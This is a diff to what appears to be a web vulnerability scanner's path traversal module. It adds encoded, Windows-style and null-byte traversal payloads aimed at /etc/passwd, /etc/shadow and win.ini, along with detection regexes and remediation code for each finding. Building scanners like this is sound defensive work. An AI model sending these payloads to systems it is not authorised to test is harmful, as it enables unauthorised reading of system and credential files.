@@ -20,6 +20,19 @@ const TRAVERSAL_PAYLOADS = [
   ".%2e/.%2e/.%2e/etc/passwd",
   "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
   "..%00/..%00/..%00/etc/passwd",                // Null byte in path segment
+  // Double URL-encoded traversal (bypass naive single-decode filters)
+  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+  "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+  "..%252f..%252f..%252fwindows%252fwin.ini",
+  // Triple URL-encoded traversal
+  "%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+  // Windows-specific path traversal
+  "..\\..\\..\\windows\\win.ini",
+  "..%5c..%5c..%5cwindows%5cwin.ini",
+  "..%255c..%255c..%255cwindows%255cwin.ini",     // Double-encoded backslash
+  "....\\\\....\\\\....\\\\etc\\\\passwd",         // Dot-dot-backslash doubling
+  "....//....//....//windows/win.ini",            // Dot-dot-slash doubling
+  "..%5c..%5c..%5cetc%5cpasswd",
 ];
 
 const TRAVERSAL_INDICATORS = [
@@ -28,12 +41,23 @@ const TRAVERSAL_INDICATORS = [
   /nobody:.*:\/nonexistent/,           // /etc/passwd
   /\[extensions\]/i,                   // win.ini
   /\[fonts\]/i,                        // win.ini
+  /\[mail\]/i,                         // win.ini
+  /; for 16-bit app support/i,         // win.ini / system.ini
+  /\[boot loader\]/i,                  // boot.ini
+  /\[operating systems\]/i,            // boot.ini
 ];
 
 const NULL_BYTE_PAYLOADS = [
   "../../../etc/passwd%00.png",
   "../../../etc/passwd%00.jpg",
   "../../../etc/passwd\x00.html",
+  "../../../etc/passwd%00.gif",
+  "../../../etc/passwd%00.pdf",
+  "../../../etc/passwd%00.txt",
+  "..\\..\\..\\windows\\win.ini%00.jpg",
+  "../../../etc/shadow%00.png",
+  // Double-encoded null byte
+  "../../../etc/passwd%2500.jpg",
 ];
 
 export const pathTraversalModule: ScanModule = async (target) => {
@@ -121,21 +145,40 @@ export const pathTraversalModule: ScanModule = async (target) => {
           const { payload, text } = r.value;
           if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
             flagged.add(key);
-            const isNullByte = payload.includes("%00") || payload.includes("\x00");
+            const isNullByte = payload.includes("%00") || payload.includes("\x00") || payload.includes("%2500");
+            const isEncodingBypass = /%25/.test(payload) && !isNullByte;
+            const isWindowsPath = /\\/.test(payload) || /%5c/i.test(payload) || /win\.ini/i.test(payload);
+            const variant = isNullByte ? "null-byte" : isEncodingBypass ? "encoding-bypass" : isWindowsPath ? "windows" : "standard";
             findings.push({
-              id: `path-traversal-${isNullByte ? "null-" : ""}${count++}`,
+              id: `path-traversal-${variant}-${count++}`,
               module: "Path Traversal",
               severity: "critical",
               title: isNullByte
                 ? `Path traversal via null byte on ${pathname}`
+                : isEncodingBypass
+                ? `Path traversal via URL encoding bypass on ${pathname}`
+                : isWindowsPath
+                ? `Windows path traversal on ${pathname} (param: ${t.paramName})`
                 : `Path traversal on ${pathname} (param: ${t.paramName})`,
               description: isNullByte
                 ? "A null byte in the file path bypassed extension validation, allowing reading of arbitrary files."
+                : isEncodingBypass
+                ? "A double/triple URL-encoded traversal payload bypassed input filters that only decode once. The server decoded the path multiple times, allowing directory traversal."
+                : isWindowsPath
+                ? "A Windows-style path traversal payload (using backslashes) returned sensitive file contents. The backend may be Windows-hosted or accepts both slash types."
                 : "A directory traversal payload returned sensitive system file contents. Attackers can read any file on the server.",
               evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
-              remediation: "Never use user input directly in file paths. Use path.resolve() and verify the resolved path stays within the intended directory.",
+              remediation: isEncodingBypass
+                ? "Canonicalize paths before validation by fully decoding URL-encoded input. Apply path validation after all decoding steps, then verify the resolved path stays within the allowed directory."
+                : isWindowsPath
+                ? "Normalize path separators (replace \\\\ with /) before validation. Use path.resolve() and verify the resolved path stays within the intended directory. Consider blocking backslash characters in file path inputs."
+                : "Never use user input directly in file paths. Use path.resolve() and verify the resolved path stays within the intended directory.",
               codeSnippet: isNullByte
                 ? `// Strip null bytes and validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst clean = req.query.file.replace(/\\0/g, "");\nconst resolved = path.resolve(SAFE_DIR, clean);\nif (!resolved.startsWith(SAFE_DIR)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
+                : isEncodingBypass
+                ? `// Fully decode then validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nlet decoded = req.query.file;\nlet prev = "";\nwhile (decoded !== prev) { prev = decoded; decoded = decodeURIComponent(decoded); }\nconst resolved = path.resolve(SAFE_DIR, decoded);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
+                : isWindowsPath
+                ? `// Normalize separators then validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst normalized = req.query.file.replace(/\\\\/g, "/");\nconst resolved = path.resolve(SAFE_DIR, normalized);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
                 : `// Resolve the path and ensure it stays inside the allowed directory\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst resolved = path.resolve(SAFE_DIR, req.query.file);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}\nconst data = fs.readFileSync(resolved);`,
               cwe: "CWE-22",
               owasp: "A01:2021",
